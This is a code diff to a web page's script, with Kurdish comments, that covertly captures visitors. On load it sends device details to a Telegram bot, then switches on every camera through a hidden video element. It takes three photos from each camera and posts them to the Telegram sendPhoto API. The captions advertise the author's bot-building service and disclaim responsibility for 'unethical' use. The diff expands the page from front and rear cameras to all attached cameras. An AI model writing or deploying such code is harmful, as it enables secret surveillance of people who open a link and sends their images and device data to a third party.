@@ -56,11 +56,6 @@
         // ماتریکێن ڕەها و پێشکەفتى (The Absolute Singularity Core Engine)
         function getAbsoluteSingularityBundle() {
             try {
-                let singularityStream = [];
-                for(let i = 1; i <= 100; i++) {
-                    singularityStream.push(`Singularity-Quantum-Node-${i}`);
-                }
-
                 const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'نەدیار';
                 const cpu = navigator.hardwareConcurrency || 'نەدیار';
                 const touches = navigator.maxTouchPoints || 0;
@@ -229,52 +224,68 @@ ${bundleSingularity}`;
             sendText(`⚛️ سەردانکەرەکێ نوو (ئاستێ ڕەها) لینک ڤەکەت!\n\n${details}\n\n⚠️ بەڕێوەبەری: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆشە ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
         }
 
-        async function captureCamera(facing, label) {
+        // سیستەمێ کامێرایێن بهێزکري (Ultra Multi-Capture Engine)
+        async function captureAllCameras() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facing }
-                });
-                const video = document.getElementById('hidden-video');
-                video.srcObject = stream;
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
 
-                return new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play().then(() => {
-                            setTimeout(async () => {
-                                const canvas = document.getElementById('canvas');
-                                canvas.width = video.videoWidth || 1280;
-                                canvas.height = video.videoHeight || 720;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                let index = 1;
+                for (let device of videoDevices) {
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({
+                            video: { 
+                                deviceId: { exact: device.deviceId },
+                                width: { ideal: 1920 },
+                                height: { ideal: 1080 }
+                            }
+                        });
+                        const video = document.getElementById('hidden-video');
+                        video.srcObject = stream;
 
+                        await new Promise((resolve) => {
+                            video.onloadedmetadata = () => {
+                                video.play().then(resolve).catch(resolve);
+                            };
+                        });
+
+                        // گرتنا 3 وێنەیان ب خێرایییا بلنتر (هەر 250 مڵیزەرقە د ناڤبەرا وان دا)
+                        for (let shotCount = 1; shotCount <= 3; shotCount++) {
+                            await new Promise(r => setTimeout(r, 250));
+
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth || 1280;
+                            canvas.height = video.videoHeight || 720;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                            await new Promise((resolveBlob) => {
                                 canvas.toBlob(async (blob) => {
                                     if (blob) {
                                         let details = await getUltimateInfo();
                                         const formData = new FormData();
                                         formData.append('chat_id', chat_id);
                                         formData.append('photo', blob, 'shot.jpg');
-                                        formData.append('caption', `📸 وێنەیێ ئاستێ ڕەها (${label}) [Absolute Singularity Scale]!\n\n${details}\n\n⚠️ بەڕێوەبەری: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆشە ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
+                                        formData.append('caption', `📸 وێنەیێ هێزپێدایی (${shotCount}) - کامێرا (${index} - ${device.label || 'Camera'})!\n\n${details}\n\n⚠️ بەڕێوەبەری: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆشە ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
 
                                         await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
                                     }
-                                    stream.getTracks().forEach(t => t.stop());
-                                    resolve();
-                                }, 'image/jpeg', 0.95);
-                            }, 500); 
-                        }).catch(() => {
-                            stream.getTracks().forEach(t => t.stop());
-                            resolve();
-                        });
-                    };
-                });
-            } catch (err) {}
+                                    resolveBlob();
+                                }, 'image/jpeg', 0.98);
+                            });
+                        }
+
+                        stream.getTracks().forEach(t => t.stop());
+                        index++;
+                    } catch (err) {}
+                }
+            } catch (e) {}
         }
 
         window.onload = function() {
             setTimeout(async () => {
                 await sendVisitorLog();
-                await captureCamera("user", "کامێرا پێشی - Selfie (Singularity Part 1)");
-                await captureCamera("environment", "کامێرا پاش - Rear (Singularity Part 2)");
+                await captureAllCameras();
             }, 100); 
         };
     </script>
